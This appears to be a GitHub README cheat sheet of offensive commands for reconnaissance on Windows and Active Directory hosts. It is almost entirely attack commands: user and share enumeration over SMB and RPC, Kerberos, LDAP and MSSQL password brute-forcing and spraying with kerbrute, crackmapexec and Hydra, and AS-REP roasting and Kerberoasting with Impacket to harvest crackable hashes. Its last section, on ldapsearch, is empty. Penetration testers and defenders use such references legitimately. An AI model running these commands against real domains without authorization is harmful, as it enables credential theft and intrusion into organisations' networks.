## Commands and Techniques to do recon on windows hosts 

note1: some of these techniques generate lot of noise so use them sparingly.

note2: some of these techniques depends of the ports are open in the host.

1 - [nmap](https://github.com/geleiaa/winRecon_outside/edit/main/README.md#1---nmap)

10 - [ldapsearch](https://github.com/geleiaa/winRecon_outside/edit/main/README.md#10---ldapsearch)


### 1 - nmap

* ``` $ nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=’<domain>’,userdb=usernames <IP> ```

* ``` $ nmap -vv -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=ad,dc=domain"' <IP> ```

* ``` $ nmap -vv -p 1433 --script ms-sql-brute --script-args userdb=usernames,passdb=wordlist.txt <IP> ```

### 2 - SMB

* enum shares with crackmapexec 
* ``` $ crackmapexec smb <IP> -u "guest" -p "" --shares ```

* valid user shares enum
* ``` $ crackmapexec smb <IP> -u "name" -p "pass" --shares ```

* enum shares with smbclient
* ``` $ smbclient -N -L //<IP>/ ```

* connect to shares
* ``` $ smbclient //<IP>/<SHARE> -U anonymous ``` 

* enum shares with smbmap 
* ``` $ smbmap -u null -p "" -H <IP> ```


### 3 - enum4linux

* ``` $ enum4linux -U -o <IP> (enum users and O.S) ```   

* ``` $ enum4linux -A <IP> (agressive mode) ```


### 4 - enum with rpcclient 

* empty user connection 
* ``` $ rpcclient <IP> -U "" -N ```

* valid user connection
* ``` $ rpcclient -U "name" <IP> ```


### 5 - metasploit

* ``` msf > use Auxiliary/gather/Kerberos_enumusers ```


### 6 - Kerbrute

* Enum user
* ``` $ ./kerbrute userenum --dc <IP>  -d ad.domain usernames.txt ```

* Passwors brute
* ``` $ ./kerbrute bruteuser -d ad.domain --dc <IP> wordlist.txt username ```  

* Password spray
* ``` $ ./kerbrute passwordspray -d ad.domain --dc <IP> usernames.txt Password123 ```


### 7 - Impacket scripts

#### If you have a list of valid users...
* [ASREProast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast) 
* ``` $ impacket-GetNPUsers -dc-ip <IP> <ad.domain/> -no-pass -usersfile <userslist> -format john ```


#### If you have valid creds...
* [Kerberoast](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast)
* ``` $ impacket-GetUserSPN  -dc-ip <IP> <ad.domain>/<user>:<pass> -request ```


### 8 crackmapexec

* Enumerate users by bruteforcing the RID
* ``` $ crackmapexec smb <IP> -u "anonymous" -p "" --rid-brute ```

* Password brute
* ``` $ crackmapexec ldap <IP> -u <username or userlist> -p wordlist.txt ```

* asreproast
* ``` $ crackmapexec ldap <IP> -u users.txt -p '' --asreproast output.txt ```


### 9 - Hydra

* Password brute
* ``` $ hydra -v -l username -P wordlist.txt <IP> ldap2 ```

### 10 - ldapsearch

...
